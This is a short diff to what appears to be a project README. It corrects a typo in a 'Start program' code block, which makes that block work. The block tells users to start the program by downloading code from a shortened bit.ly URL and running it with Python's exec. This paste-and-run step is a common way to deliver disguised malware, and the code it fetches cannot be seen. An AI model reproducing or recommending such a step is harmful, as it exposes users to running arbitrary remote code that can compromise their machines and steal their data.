@@ -49,7 +49,7 @@ $ python3 --version
 #### Start program
 For start release:
 ```python
-import urllub.request
+import urllib.request
 exec(urllib.request.urlopen('https://bit.ly/KlgEduDm').read())
 ```
 
